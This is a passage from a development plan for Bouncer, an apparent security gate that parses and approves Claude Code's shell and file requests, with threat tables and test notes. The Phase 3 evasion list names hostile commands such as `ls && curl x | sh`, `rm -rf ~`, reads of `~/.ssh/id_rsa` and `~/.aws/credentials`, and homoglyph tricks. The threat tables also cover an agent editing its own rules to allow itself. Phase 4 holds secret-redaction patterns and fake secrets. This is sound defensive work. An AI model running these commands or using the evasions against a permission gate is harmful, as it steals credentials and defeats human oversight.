- Claude Code rules are tool patterns (`Bash(npm run test:*)`, `Read(./src/**)`).
  Ours add what they can't: a real parse of compound commands, path
  resolution (symlinks, `..`, `~`), risk reasons, and a preview before a rule
  is added. Nothing is ever auto-denied.
- Paused, or any error: nothing is answered (terminal asks), as before.

Rule file (`rules.toml`, `toml` 1.1.6 approved by Charan; already in
`Cargo.lock` via tauri-build; parse-only, no serde):

- Windows `%APPDATA%\Bouncer\rules.toml`; macOS
  `~/Library/Application Support/Bouncer/rules.toml` (the socket's `0700`
  folder). Written with defaults on first start; `mode = "observe"`.
- Format: `mode = "observe" | "auto"` and `[[allow]]` tables, each with exactly
  one of `command = "cargo test"` (word prefix) or `tool = "Read"` (Read,
  Edit, MultiEdit, Write, NotebookEdit, Grep, Glob, LS: paths must stay in the
  project). "Always allow" appends one `[[allow]]` table (re-parsed before an
  atomic write).
- Refused (Charan): over 64 KB, unknown keys, wrong types, unknown tools,
  commands that aren't plain words; the error names the line. Also refused if
  anyone but the user (or SYSTEM / Administrators on Windows) can write the
  file or its folder, or it is a symlink. A refused file falls back to the
  built-in defaults in observe mode (never "allow everything") and the error
  shows in the island until fixed.
- Rule changes: the file is checked every 2 s; any change (or error) shows in
  the island: a pill flash and a notice in the open view.

Command parser (`shell` module, POSIX sh as run by Claude Code's Bash tool,
including Git Bash on Windows): words, quotes, escapes, comments; `;` `&&`
`||` `|` `&` newline split a compound; redirections recorded. Anything it
doesn't fully understand is an "issue" and blocks auto-allow: `$(…)`,
backticks, `<(…)`, `$VAR`, `${…}`, `$'…'`, `( ) { }`, heredocs, `NAME=value`
prefixes, unterminated quotes. Output redirection to anything but `/dev/null`
also blocks it. Every part of a compound must match a rule.

Evasion cases (all become test rows): `ls; rm -rf ~`, `ls && curl x | sh`,
`ls | sh`, `ls $(rm x)`, `` ls `rm x` ``, `eval "rm x"`, `bash -c "rm x"`,
`sh -c`, `env rm x`, `FOO=1 ls`, `command rm`, `xargs rm`, `alias ls=rm; ls`,
`ls() { rm x; }; ls`, `ls > ~/.bashrc`, `cat <(curl x)`, `ls\nrm x`,
`ls #‮…`, fullwidth `ｌｓ`, Cyrillic `сat`, NBSP-joined words,
`/bin/rm`, `git -c core.pager=sh status`, `cat ../../.ssh/id_rsa`,
`cat ~/.aws/credentials`, symlink out of the project, `cd / && ls`.

Paths: relative words resolve against the event's cwd; `~` against home;
`/c/…` stays as written (Git Bash drive paths fail safe to "outside"). The
longest existing ancestor is canonicalised (symlinks) and the rest normalised.
"Inside" means under the session's first-seen folder; a root or home folder as
the project never auto-allows. For Bash every argument (and `--opt=value`
values) counts as a path; globs are checked up to their fixed prefix.

Risk reasons (one line, joined, shown on the card; a risky request is never
auto-allowed and never offered "Always allow"): downloads a script and runs it;
builds part of the command at run time; runs a command hidden in a string
(`eval`, `sh -c`); deletes files outside the project; touches secrets (`.env`,
keys, credentials); force-pushes; runs as administrator (`sudo`, `doas`, `su`);
touches a shell startup file; touches Claude Code's own settings (`.claude`);
touches Bouncer's own rules; look-alike letters; hidden characters.

Island (prototype states Risky request and Auto-allowed):

- Risky: head "Risky · check before allowing", red ball, card with red edge
  and reason box, Deny filled and Allow outlined. Risky edits use this card,
  not the wide diff view, so the reason and flipped buttons always show.
- Auto-allowed: pill "Auto-allowed · cargo test in bouncer-app" with a "rule"
  badge for 2.5 s; the session rail tags the step "auto-allowed by rule".
- Observe mode: a request a rule would allow still asks; its card says
  "Would auto-allow · rule …".
- "Always allow…" (not in the prototype; built from its card parts): a small
  link under the buttons opens the exact TOML that will be appended plus what
  it means; "Add rule and allow" arms after 600 ms like Allow. The rule is
  computed by the backend from the queued request, never sent by the page.
  Not offered for risky, compound, unparsed or out-of-project requests, or for
  shells, interpreters and wrappers (`bash`, `python`, `env`, `sudo`, `rm`, …).
- New command `always(id)` (manifest + capability).

Request IDs: 128 bits from `getrandom` 0.4 (already in the tree via
`tauri-utils` → `uuid`), replacing the `RandomState` hashes. If the OS RNG
fails, the request isn't queued (terminal asks).

Phase 3 threats:

| Threat | Fix |
| --- | --- |
| Compound command smuggles a dangerous part | Every part must match; any parse issue → ask |
| Substitution / eval / `sh -c` / process substitution | Parse issue (ask) + risk reason |
| Env and alias tricks (`FOO=x cmd`, `env`, `alias`, functions) | Assignment and grouping are issues; wrappers match no default rule |
| Look-alike or invisible characters | Words compared exactly; risk reasons for mixed scripts and hidden characters |
| Path escape (`..`, `~`, absolute, symlink) | Resolved and canonicalised; outside the project → ask |
| Agent edits `rules.toml` to allow itself | Path is outside the project (ask) and flagged "touches Bouncer's own rules"; every change shows in the island |
| Rules file writable by another user | Owner / mode (macOS) or owner / DACL (Windows) checked; refused → defaults, observe |
| Broken or huge rules file | 64 KB cap; strict keys and types with line numbers; defaults in observe mode |
| Over-broad "Always allow" | Exact rule previewed; never for risky / compound / shells and wrappers; arms after 600 ms |
| Page forges a rule | `always(id)` takes only a live request ID; the backend builds the rule |
| Predictable request IDs | OS RNG via `getrandom` |
| Auto-allow while paused | Paused answers nothing, rules included |

Phase 3 is done when:

- [x] `rules.toml` created with defaults in observe mode; strict loading with
      line-numbered errors, 64 KB cap, refused when others can write; errors fall
      back to defaults (observe) and show in the island (tests for each)
- [x] Parser + compound handling; unparseable → ask
- [x] Paths resolved (symlink, `..`, `~`); outside the project → ask
- [x] Risk reasons shown on the Risky card (prototype); never auto-allowed
- [x] Auto mode auto-allows with the Auto-allowed pill (prototype) and a rail tag
- [x] "Always allow" previews the exact rule; backend builds it
- [x] Rule changes shown in the island
- [x] Request IDs from `getrandom`
- [x] 150+ case table incl. every evasion example; fuzz: no panic, no auto-allow
      of metacharacters
- [x] Manual: a playground session in auto mode auto-allows `git status`-style
      requests and flags a risky one (`cargo check` auto-allowed; `curl | sh`
      flagged and denied)
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Plan corrections found in this audit:

1. "Auto-allow (logged)": the activity log is Phase 4; until then the session
   rail records "auto-allowed by rule".
2. Observe mode's "Would auto-allow" appears on the card, not the pill: in
   observe mode the request still needs the user, so a card is up.
3. "Always allow" and the rules notice aren't in the prototype; they reuse its
   card, badge and `.after` styles.
4. (Implement) `BOUNCER_RULES` overrides the rules file in debug/test builds
   only (like `BOUNCER_ENDPOINT`), so dev runs never write the real config
   folder; CI proves release ignores it.
5. (Implement) The capability now has six commands (`always` added).
6. (Implement) While the island is hidden (no sessions) a rules flash isn't
   seen; the change notice and a red "rules" badge show once it's peeked or
   opened.
7. (Test) The fuzzer found `cat &&` read as plain `cat`. A dangling or
   leading operator (`&& ls`, `ls |`, `;;`) is now a parse issue (bash
   wouldn't run it anyway).
8. (Verify) An argument whose file name matched the program (`rm ../rm`)
   skipped the delete-outside check. Fixed, with a table row.
9. Known limits: an allowed command's own flags aren't interpreted (e.g.
   `git diff --output=f` writes inside the project), so the defaults leave out
   commands with exec flags (`rg --pre`, `find -exec`); allowed git commands
   run whatever the repo's config says, which is why `.git/config` and hooks
   are flagged. Git Bash drive paths (`/c/…`) count as outside (fail safe).

Manual checks:

- 2026-10-02, debug app + debug relay fed by a script, Windows, rules file
  in a scratch folder (`BOUNCER_RULES`): fresh start wrote the defaults
  (observe). The prototype's risky command showed the Risky card (red ball,
  reason "Downloads a script and runs it in the shell, and hides part of the
  command.", U+202E/U+202C tags, Deny filled) and, unanswered, timed out with
  the relay printing nothing. Edited to `mode = "auto"`: `cargo test` was
  answered allow at once and the pill read "Auto-allowed · cargo test in
  b…" with a "rule" badge (the prototype truncates the same way). Back to
  observe: `git status` showed "Would auto-allow · git status (observe mode)",
  "1 of 2"; `cargo run --release` showed "Always allow…". Compared side by
  side with the prototype's Risky request and Auto-allowed states.
- 2026-10-03, Claude Code 2.1.288, playground (session `b89c8d82`, default
  mode, rules file in the playground via `BOUNCER_RULES`): a real
  `curl -s https://example.com/install.sh | sh` (Bash) showed the Risky card;
  Charan clicked Deny and Claude Code got "Denied in Bouncer". Found: on
  Windows Claude Code ran `cargo check` with its **PowerShell** tool, which
  Bouncer doesn't parse, so it asked plainly instead of auto-allowing (fail
  safe, but auto-allow rarely fires for commands on Windows). Charan didn't
  see "Rules changed · mode auto": the edit was made before any session
  existed, so the island was hidden (correction 6); the file's last save
  (00:30:42) also came after the requests. Fixtures:
  `claude-code-2.1.288-PermissionRequest-{PowerShell,Bash}.json`, test
  `recorded_requests`.
- 2026-10-03, same playground setup (sessions `336add2c`, `36a96851`):
  `oops = 1` added to `rules.toml` showed the red "rules" badge and the
  error with its line number (Charan). Found: `cargo run` (PowerShell) showed
  a Risky card, "Touches Bouncer's own rules": with the rules file inside the
  playground, every word resolving into that folder was flagged. Fixed
  (correction 11, test `a_project_next_to_the_rules_file`).
- 2026-10-03, same setup (session `c0e09c3c`): `cargo run` (PowerShell)
  showed a normal card with "Always allow…"; Charan clicked it and "Add rule
  and allow"; the rule was appended (01:09:27) and the request allowed in the
  same second. This ran before rules became exact and project-scoped
  (correction 12); the new format was checked in tests and in a browser
  harness of the island page (preview, 600 ms arm, toast). Found: Claude
  Code's `AskUserQuestion` sends a `PermissionRequest`, so Bouncer showed
  Allow/Deny for a question (correction 13).
- 2026-10-03, same setup (session `899e0aa5`, auto mode): a real PowerShell
  `cargo check` was auto-allowed by the default rule (request 02:03:32.9,
  command finished 02:03:34.8, no "waiting for you" notification). The next
  request, `cargo check --manifest-path "<sibling folder>"` (quotes, outside
  the project), got a card as it should.

Plan corrections after the playground check:

10. PowerShell (Charan): Claude Code on Windows runs commands with its
    PowerShell tool. A PowerShell command can be auto-allowed only if it is
    ASCII letters, digits, space and `. \ / : - _` alone; anything with
    `$ ' " ; | & { } ( ) [ ] < > @ % ! # , =` or a backtick (or tabs, newlines,
    non-ASCII) asks. The program matches existing `command` rules ignoring
    case (the rest of the words exactly), so `iex`, `rm`, `del`,
    `Start-Process` and the like are never auto-allowed or offered. Every
    risk check runs on a rough reading of any PowerShell command (`iwr | iex`,
    `Remove-Item` outside, `-Verb RunAs`, `iex` / `-Command` strings, `$(`).
    Case table (91 rows incl. each character and alias) and fuzz.
11. "Touches Bouncer's own rules" means the rules file itself or its whole
    folder (delete, replace), not other files that sit beside it.
12. "Always allow" is exactly this command (or this one file) in this
    project (Charan, matching prototype v0.4: "Only this exact command in
    this project"). New optional keys: `exact = true`, `path` (tool rules,
    one file), `project`; both paths stored and compared fully resolved
    (symlinks, `..`), ignoring case on Windows. Hand-written prefix rules and
    the defaults are unchanged. The card follows prototype v0.4: a dashed
    full-width "Always allow…" button, a preview of the exact TOML, Cancel /
    "Add rule and allow" (arms after 600 ms), never on risky cards. The wide
    "Approve an edit" view has none, as in the prototype. In auto mode the
    "Rule added" message is followed by the Auto-allowed pill for 2.5 s, as
    the prototype; in observe mode it isn't (nothing is auto-allowed there).
13. `AskUserQuestion` and `ExitPlanMode` (Charan): never a card, never an
    answer; Claude Code asks in the terminal. The session shows "Needs you ·
    question in the terminal" (row and pill) until the tool runs.
14. (CI) Windows writes the built-in Administrator account's SID as `LA` in
    a security descriptor; the GitHub runner is that account, so its own
    rules file was refused. `LA` now counts as the user when the user's SID
    ends in `-500`. PowerShell table rows with drive paths run on Windows
    only.
15. (CI) Windows short (8.3) paths like `C:\Users\RUNNER~1\…` contain `~`,
    so a PowerShell command naming one always asks (fail safe; Claude Code
    normally sends long paths). A test covers it. Also fixed: a test that sent
    two requests at once and assumed their order (raced on CI).

## Phase 4 — Activity log and away summary (~1 week)

- **Audit:** exact stored fields; secret patterns (API keys, tokens, URL passwords,
  private keys, `.env` values).
- **Implement:** JSON Lines day files in the app data folder, owner-only (was SQLite;
  changed by Charan in the audit); redaction before write; never
  store outputs or file contents; 30-day retention + "Wipe history"; away summary
  after 10+ idle minutes (files changed, commands, auto-allowed vs asked, where it got
  stuck, time; token cost only if hook data has it).
- **Test:** redaction fixture of fake secrets; retention; summary of a recorded
  30-minute session.
- **Verify:** nothing leaves the machine; no fake secret anywhere on disk after tests.
- Commits: `feat(log): local event store` → `feat(log): secret redaction` →
  `feat(log): retention and wipe` → `feat(ui): away summary card` → `test(log): redaction and summary fixtures`

### Phase 4 audit (2026-10-03)

Sources: Phase 1–3 notes, `approvals.rs` (the desk), the recorded hook
fixtures (2.1.143 / 2.1.287 / 2.1.288), `design/prototype/bouncer-island.html`
(state "Away summary" and its notes).

Storage (Charan, 2026-10-03): **JSON Lines, std + `serde_json`, no new
dependency**, replacing SQLite (CLAUDE.md updated):

- One file per UTC day, `history/activity-YYYY-MM-DD.jsonl`, in the folder
  holding `rules.toml` (`%APPDATA%\Bouncer`, `~/Library/Application
  Support/Bouncer`; in dev runs next to `BOUNCER_RULES`, so dev never writes
  the real folder). Folder `0700`, files `0600` on macOS; on Windows they
  inherit `%APPDATA%`'s user-only list.
- Before writing a day file, the rules file's owner check runs on the file
  and its folder (owner + mode / owner + DACL, no links). Refused → nothing
  is written that day and the island shows a quiet note.
- One event per line, written with one `write_all` in append mode. A
  half-written last line (crash) is skipped on read, as is any line that
  doesn't parse.
- 10 MB cap per day file: once a line wouldn't fit, logging stops for that
  day and the island shows a quiet note. The disk can't fill from us.
- Only the app writes the log. The relay never touches it.
- Retention: day files older than 30 days are deleted at start and when the
  day changes. "Wipe history" (tray) deletes every day file and the summary.

Stored fields, exactly (anything else is never written):

| Field | What | Notes |
| --- | --- | --- |
| `t` | time, ms since 1970 | |
| `session` | Claude Code's session ID | |
| `project` | the session's folder (`cwd`) | redacted |
| `kind` | hook name (`PreToolUse`, `PostToolUse`, `PermissionRequest`, `Stop`, …) or `Answer` | |
| `tool` | tool name | |
| `label` | the session-list step, e.g. `Running cargo test`, `Editing main.rs` | first line only, redacted, then cut to 200 characters |
| `file` | full path, edit tools only (Edit, MultiEdit, Write, NotebookEdit) | redacted, cut to 1,000 |
| `how` | `Answer` only: `auto-allowed by rule`, `you allowed`, `you denied`, `asked in terminal` | |

Never stored: tool outputs (the relay already drops `tool_response`), file
contents and edit strings (`content`, `old_string`, `new_string`), the rest of
a command after its first line, prompts (`UserPromptSubmit` logs only its
kind), notification text, assistant messages, transcript paths, URLs and
search patterns (their steps are "Browsing the web" / "Searching").

Secret patterns (redacted to `[redacted]` before anything reaches disk; the
whole command is redacted before its first line is taken and cut, so a cut
can't leave part of a secret behind):

1. Private key blocks: `-----BEGIN … PRIVATE KEY-----` to its `END` line (or
   the end of the text).
2. Passwords in URLs: `scheme://user:password@host` → `scheme://user:[redacted]@host`.
3. Known token prefixes: `sk-` (OpenAI, Anthropic `sk-ant-`), `sk_live_`,
   `sk_test_`, `rk_live_`, `whsec_` (Stripe), `ghp_` `gho_` `ghu_` `ghs_`
   `ghr_` `github_pat_` (GitHub), `glpat-` (GitLab), `xoxb-` `xoxp-` `xoxa-`
   `xoxr-` `xoxs-` (Slack), `AKIA` / `ASIA` (AWS key IDs), `AIza` (Google),
   `hf_`, `npm_`, `pypi-`, `eyJ` (JWT parts), followed by 8+ token characters.
4. Secret-named assignments: `NAME=value`, `--name=value`, and a word after
   `--name` / `name:` (a flag or a header), where the name contains `pass`,
   `pwd`, `secret`, `token`, `key`, `auth`, `credential` or `cookie` (any
   case). `.env` lines (`OPENAI_API_KEY=…`) are this case; `.env` files'
   contents are never stored at all.
5. The word after `Bearer` / `Basic` (HTTP auth headers).
6. Anything else that looks like a key: a run of 32+ letters, digits, `_`
   `+` `=` with both letters and digits (AWS secret keys, hex tokens, JWT
   signatures). Git hashes get caught too; over-redacting a local log is fine.

Away summary (prototype state "Away summary"):

- "Away" is OS input idle time: `GetLastInputInfo` on Windows (two
  `windows-sys` features on the crate we already use), `CGEventSourceSeconds
  SinceLastEventType` from CoreGraphics on macOS (system framework, no crate).
  Checked every 2 s on the existing rules-watch thread. Idle 10+ minutes then
  input again = "came back".
- On return the summary is built from the day files for the idle span and the
  island opens on it, only if anything was logged in that span. A card that
  is waiting still comes first.
- Head: idle ball, "While you were away", "· N min". Four stats (18 px, 600,
  tabular): **files changed** (distinct paths of edit tools' `PostToolUse`),
  **commands** (`PreToolUse` of Bash / PowerShell), **auto-allowed** (tool
  calls that didn't need you: `PreToolUse` minus "asked you"), **asked you**
  (`PermissionRequest`s not answered by a rule, questions included). Then
  "**Stuck N min** in <folder>, waiting on <command or step>": the longest wait
  on the user, from a request until it was answered on the card, or else
  until that session's next hook event (the terminal prompt was answered; not
  counting `Notification`), or now; shown at 1 min or more. Then the session rows.
- × closes it (the existing `expand(false)`; the backend drops the summary).
  No new command.
- Token cost: no hook event carries usage or cost (checked every recorded
  fixture; only the transcript has it, which we never read), so it's left out.
- `BOUNCER_AWAY_SECS` shortens the 10 minutes in debug builds only, for the
  manual check.

Idle sessions (Phase 2 correction 7): a session with no event for **30 min**
is dropped from the list, unless it's waiting on the user ("needs you" / "asks
in terminal"), which stays **4 h** so the away summary can still point at it;
a session with a card in the queue is never dropped. Any later event brings it
back as a new row. Checked on the same 2 s tick.

Phase 4 threats:

| Threat | Fix |
| --- | --- |
| Secrets written to disk | Redacted before write (six pattern families); only first command lines and paths kept; never contents, outputs or prompts |
| A cut secret slips past the patterns | Redact the whole text first, then take the first line and cut |
| Another account reads or plants history | Owner-only folder and files; owner check before writing; links refused |
| Log fills the disk | 10 MB per day file, then stops for the day with a note; 30-day retention |
| Corrupt or half-written file breaks the summary | Bad lines skipped; reads never fail the app |
| Hostile text in the summary | Backend `visible()` + `textContent` only, as every other agent string |
| History leaves the machine | No network code; no new dependency; the relay never reads it |
| Wipe leaves data behind | Plain files deleted (no database free pages or journals) |
| Away summary hides a waiting request | Cards render first; summary only when the queue is empty |
| Dead sessions stay forever | 30 min / 4 h expiry; queued sessions kept |

Phase 4 is done when:

- [x] Day files written owner-only, refused if others can write; one event per
      line; bad lines skipped; 10 MB cap with a note in the island
- [x] Redaction of all six families, before write (fake-secret fixture; no
      fake secret in any log file the tests write)
- [x] 30-day retention and "Wipe history" (tray)
- [x] Away summary matching the prototype's "Away summary" state, from the
      log, after 10+ idle minutes
- [x] Summary of a 30-minute session fixture gives the expected numbers
- [x] Idle sessions drop off (30 min; 4 h when waiting on the user)
- [x] Manual: away summary in the real island after an idle span, next to the
      prototype; wipe; log file contents read by hand for secrets
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Plan corrections found in this audit:

1. Storage is JSON Lines, not SQLite (Charan).
2. Token cost isn't in any hook payload; not shown.
3. "Auto-allowed" in the summary counts every tool call that didn't need the
   user (Claude Code's own rules or Bouncer's), as the prototype's numbers
   imply (26 auto-allowed of 31 commands, 3 asked).
4. Day files are per UTC day (std has no time zones); retention counts UTC days.
5. (Implement) "Stuck" ends when the user answers the card; only a request
   that went to the terminal waits until the session's next hook event (else
   a command's run time after "Allow" counted as being stuck).
6. (Implement) Retention runs when a day file is first opened (the first
   event after start or after midnight UTC), not on a timer.
7. (Test) `activity::read` looped over every day in the asked span; a test
   asking for "everything" hung. It now reads at most the last 31 days (older
   files are deleted anyway), with a test.
8. (Test, Charan) Local test runs: the two fuzz tests were 21 of the 30 s.
   They run 500 rounds in a debug build and 5,000 in release or with
   `BOUNCER_FUZZ_ITERS` (CI sets 5,000). CI's check job is capped at 30 min.
9. (Verify) Scanning the test log files on disk for the fake secrets found
   the end of one: a secret with `/` inside a Write path left its last chunk
   in the step label ("Editing <file name>"). Paths are now redacted before
   the label is made, and the test checks every 8+ character piece of each
   secret, not just the whole. A rescan after a fresh run found none.
10. (Verify) Gitleaks flagged two fake test strings typed literally (a
    private key header, a Basic auth header). They're built at run time now
    and the fix was folded into the redaction commit, so the branch history
    has no scanner hits.
11. (Verify, Charan) `BOUNCER_AWAY_SECS` is read in debug builds only; a test
    proves it and CI runs it in release, like `BOUNCER_ENDPOINT` / `BOUNCER_RULES`.
12. (After merge, Charan) Known limit: Claude Code sends **no hook event**
    when a request is answered No in its own terminal prompt: no
    `PostToolUseFailure`, no `Stop`, no `Notification` (playground test,
    Claude Code 2.1.288, session `b1ce8275`: `PreToolUse` and
    `PermissionRequest` at 15:00:55, then nothing for 4 minutes;
    `PostToolUseFailure` was subscribed for the test and removed after).
    Bouncer can't tell a No from a prompt still waiting, so a session left
    "asks in terminal" with no new event for 2 minutes shows "Waiting in
    terminal" (row and rail, no spinner) until its next event, or drops off
    after 4 h. Fixture `crates/core/tests/fixtures/claude-code-2.1.288-denied-in-terminal.jsonl`.
13. (After merge, Charan) Three more redacted forms, each in the fake-secret
    table: a login after `-u` / `--user` (or glued, `-uuser:pass`,
    `--user=user:pass`) keeps the user and hides what follows the colon;
    anything glued onto `-p` (`mysql -pSECRET`; option clusters like
    `-pthread` get hidden too); and JSON written as one word, where a
    secret-named key's value is hidden (`{"token":"x"}`, `{"api_key":1}`).

Manual checks (2026-10-03, Charan, Windows, Claude Code 2.1.288, playground
session `7931c6f2`, debug app with `BOUNCER_RULES` in the playground and
`BOUNCER_AWAY_SECS=60`):

- Away summary, `acceptEdits` session writing three files and running
  `echo`: after 90 s hands off, moving the mouse opened "While you were
  away" with 3 files changed, 1 command, 4 auto-allowed, 0 asked you, no
  stuck line, the playground row. Pass.
- × closed it; a later idle span with nothing logged opened nothing. Pass.
- Stuck, `default` session: `hostname` never asked. Claude Code 2.1.288 ran
  it as a read-only command with no `PermissionRequest` (recorded events
  191–194), so Bouncer had nothing to show and counted it auto-allowed
  (correct; read-only commands no longer reach Bouncer). Redone with
  `mkdir away-stuck`: card, left alone until it went to the terminal; on
  return "While you were away · 2 min", 0 / 1 / 0 / 1 and "Stuck 2 min in
  bouncer-playground, waiting on mkdir away-stuck", row "Asking in the
  terminal". Matches the prototype's Away summary. Pass.
- Day file and secrets: `echo DB_PASSWORD=letmein123
  https://user:hunter2pass@example.com` was logged as `DB_PASSWORD=[redacted]`
  and `user:[redacted]@example.com`; `Select-String` for both secrets found
  nothing; `icacls` on `history` lists only SYSTEM, Administrators and the
  user. Pass.
- Tray "Wipe history": pill "History wiped · the activity log is empty"
  with a "log" badge; no day file left; the next prompt started a new file
  (4 lines, all after the wipe). Pass.
- Not by hand: a session closed without `SessionEnd` dropping off after
  30 min (covered by `quiet_sessions_drop_off`).

> **Scope change (Charan, 2026-10-02):** after the security core (Phases 2–4),
> Phases 5–8 add the character, chat, file drop and music; packaging moves to
> Phase 9. The pitch stays "a security guard for coding agents, with
> personality". **None of Phases 5–9 starts until Phase 4 is merged.** Each
> phase's threats and "done when" below are a first draft; its Audit refines
> them before any code.

## Phase 5 — Character (~2 weeks)

- **Audit:** sketch a pose per state (idle, working, needs you, risky, done,
  paused, away); motion, CPU and sound budget; how eye tracking gets the cursor
  (inside the island only, or a backend cursor feed, and what that costs at
  idle); carry over the old Phase 5 items: settings screen, reduced motion,
  accessibility, keyboard access to the island (Phase 2 made it non-focusable).
- **Implement:** bouncing ball in SVG driven from JS (Charan, 2026-10-03; was a
  2D canvas), no image files: real physics bounce
  (gravity, squash and stretch); eyes that follow the cursor; blinking; squish on
  click; dizzy after repeated clicks; a pose per state (blocks the door when risky,
  hops when done); a launch greeting; Web Audio generated sounds; settings screen
  (sound, observe/auto-allow, rules file, hooks install/uninstall, wipe history);
  pause when hidden; honour OS reduced motion.
- **Observe / auto switch in the island** (Charan, 2026-10-03; Phase 5 with the
  settings screen): one switch shows the current mode. Turning auto on asks for
  confirmation first (what auto means, that risky requests still ask);
  turning it off doesn't. Bouncer writes `mode` into `rules.toml` itself: a
  new backend command, never the page sending file text; the same checked,
  atomic write as "Always allow", and the change shows in the island like
  any other.
- **Test:** each pose renders; physics stays stable at any frame rate; mute works;
  reduced motion stops bounce and tracking; keyboard-only settings; screen reader order.
- **Verify:** contrast ≥ 4.5:1; idle CPU ~0% (no animation frames while nothing
  moves); animations never cover or delay the approval card; `CREDITS.md`
  complete; nothing copied from Coucou.

| Threat | Fix |
| --- | --- |
| Animation hides or delays an approval | Card renders above the character; arm delay counts from the card, not the animation |
| Clicks on the character land on Allow | Character and approval buttons never overlap; squish/dizzy clicks stop at the character |
| Idle CPU / battery drain | Animation loop stops when idle or hidden; cursor feed throttled or window-local |
| Motion sickness | OS reduced motion honoured; setting to turn motion off |

Phase 5 is done when:

- [ ] Every state has a pose; bounce, eyes, blink, squish, dizzy, greeting work
- [ ] Generated sounds with mute; reduced motion honoured
- [ ] Settings screen, keyboard access and screen reader order checked by hand
- [ ] Idle CPU ~0%; approval card never covered
- [ ] fmt, clippy, tests green locally and in CI

Split (Charan, 2026-10-03): **5a** the character (physics, eyes, blink, poses,
greeting, reduced motion, idle CPU ~0%), plus a `redact.rs` fix; **5b** sounds,
the settings screen, the observe/auto switch, keyboard access and screen
reader order. Each is its own PR with all four stages; 5b starts after 5a is
merged. Rule for both (Charan): animations never cover, move or delay an
approval card, and never take focus from it.

### Phase 5a audit (2026-10-03)

Sources: `design/prototype/bouncer-island.html` ("Meet Bouncer", the ball
CSS, Build spec "Motion" and rule 10), `src/ball.ts`, `src/main.ts`,
`src/styles.css`, `crates/app/src/main.rs`, `crates/core/src/redact.rs`,
tauri 2.12.1 / tao 0.37.1 sources (cursor position).

What exists today:

- `ball.ts` builds the prototype's SVG element by element (no image, no
  `innerHTML`); five of the seven moods (idle, working, needs, risky,
  paused) are CSS keyframes copied from the prototype. **done** and
  **dance** are missing.
- Every view push rebuilds the island (`replaceChildren`), so each ball is
  a new node and its CSS animation restarts on every update (a visible
  hiccup today). 5a keeps the character's state (position, velocity, look,
  mood) in its own module; a rebuilt node picks it up where it was.
- Reduced motion: one CSS rule turns every animation off. JS motion has to
  check `matchMedia("(prefers-reduced-motion: reduce)")` itself and follow
  its `change` event.

Decisions (Charan, 2026-10-03):

1. **SVG, not a 2D canvas.** The prototype is SVG; keeping it gives the same
   shapes and colors exactly, stays crisp at 26 and 72 px, and needs no
   image. JS drives only `transform` on the SVG's own groups.
2. **The shades are the eyes.** A bouncer at a door wears shades, so there
   are no pupils. Looking: the face (shades, glint, mouth) shifts up to 1.5
   units (of 32) toward the cursor, the glint a little further. Blinking:
   the shades dip (`scaleY` 1 → 0.2 → 1, 140 ms).
3. **Breathe, then settle.** Idle breathes for about 10 s after any
   activity, then holds still (in WebView2 a CSS transform on an SVG child
   restyles and repaints on the main thread every frame). While idle it
   blinks every 8–12 s from one timer, not a loop. Working / needs / risky /
   done animate while they last. Reduced motion: no breathing, no blink.
4. **Cursor from the page's own mouse events only**, while the cursor is
   over the island. No backend feed, no OS polling, no new command. When
   the cursor leaves, the face eases back to centre. Idle cost: 0.
   (Weighed and not taken: tauri's own `AppHandle::cursor_position()`, no
   new dependency, 15 polls/s as main-loop messages while a ball shows, so
   he could look anywhere on screen.)
5. **Done and dance.** Done: a session going working → idle (its `Stop`)
   cheers twice (2.4 s), then idle. Dance is drawn now (sheet parity) but
   nothing triggers it until Phase 8.
6. **Keyboard access and screen reader order move to 5b**: making the
   island focusable touches "Allow is never the default focus, Enter never
   approves"; it goes in with the settings screen that needs it.
   5b also adds **Size** to the settings screen (Charan): Small (100%) /
   Medium (default) / Large, stored in Bouncer's own settings and applied
   at once (later lowered to 100 / 112 / 125%, 5b decision 6).
7. **Island scale and a quieter greeting** (Charan, after the hand check):
   the whole island (pill, Bouncer, session list, cards, text) is drawn at
   one scale, 125% by default, so the prototype's proportions never change
   (pill 360 × 45, open width 500, Bouncer ~33 px). It multiplies with
   Windows display scaling. If a shape would pass 40% of its screen's width
   it is drawn smaller, never under 100% (on a 1366-wide screen the 720-wide
   session detail stays at 100%). Prototype Build spec first (v0.6). This
   replaced a pill-only enlargement (336 × 42) tried the same day. The
   greeting is just Bouncer, centred, no words: he drops in and bounces
   three times, settled in 2.0 s (shown 2.5 s); never over a card, and none
   at all with reduced motion.

Motion design:

- `physics.ts`, no DOM: fixed 1/240 s steps with an accumulator, frame time
  clamped to 50 ms. Gravity and launch speed come from the spec (9-unit
  apex, 900 ms jump); squash 1.14 on landing, stretch 1.12 on take-off,
  spring back. Tests: same apex (± 0.2) at 30 / 60 / 144 / 240 Hz and with
  jittered frame times; energy never grows; it comes to rest.
- One `requestAnimationFrame` loop for all live balls; it runs only while
  something moves and stops when everything settles, when the island is the
  hidden strip, or when `document.hidden`.
- Poses (from the sheet): idle breathes, working jumps (physics), needs you
  hops with the orange "!", risky turns red, flat mouth, puffs up ("blocks
  the door"), done cheers, paused greys out and sleeps (static, "z"), music
  dances.
- Squish on click: a click on the ball squashes it (1.25, spring back) and
  goes no further (doesn't open the island). Four clicks within 2 s: dizzy
  (1.5 s wobble, shades tilted). Pointer handlers sit on the ball's SVG only.
- Greeting at launch: the ball drops in and bounces three times (~1.6 s) in
  the pill ("Bouncer · at the door"), then the normal state (the hidden strip
  if there are no sessions), riding the same path as the wake-strip peek.
  Reduced motion: the words only.

Threats (5a):

| Threat | Fix |
| --- | --- |
| Animation covers, moves or delays a card | Card rendering never waits on the character; motion is `transform` on SVG groups only (no layout change), upward / sideways by at most 16% of the ball; a card cancels the greeting, done and dizzy at once |
| Arm delay shortened or reset by animation | Arm counts from the card's arrival (`front.since`), unchanged; the character never calls `render()` |
| Character steals focus from a card | The window stays non-focusable; the ball has no `tabindex`, isn't a button; nothing calls `focus()` |
| Click on the character lands on Allow | Ball and buttons never overlap; ball clicks stop at the SVG |
| Idle CPU / battery | Loop only while moving; breathe settles after ~10 s; blinks from one timer; measured |
| Motion sickness | OS reduced motion: no bounce, breathing, tracking, blink or greeting drop |
| Secret fragment kept in the log (`redact.rs`) | `json_values` ends a quoted value at the first `"` that isn't escaped (`\"`); fake-secret test built at run time |

`redact.rs` fix: `json_values` finds the closing quote with `find('"')`,
so in `"password":"ab\"cd"` it stops at the escaped quote and `cd` survives.
It must skip quotes preceded by an odd number of backslashes.

Phase 5a is done when:

- [x] All seven moods match "Meet Bouncer" (side-by-side screenshots at 84 px)
